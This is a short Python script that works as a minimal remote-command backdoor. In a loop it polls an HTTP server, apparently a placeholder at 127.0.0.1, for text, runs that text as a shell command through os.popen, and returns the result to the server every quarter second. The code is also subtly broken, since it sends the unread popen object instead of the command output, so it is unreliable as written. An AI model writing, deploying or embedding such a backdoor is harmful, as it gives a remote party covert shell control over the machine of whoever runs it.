import requests
import os
from time import sleep
while True:
    r = requests.get("http://127.0.0.1")
    output = os.popen(r.text, 'r', 1)
    payload = { 'q': output}
    requests.get("http://127.0.0.1/output", params=payload)
    sleep(.25)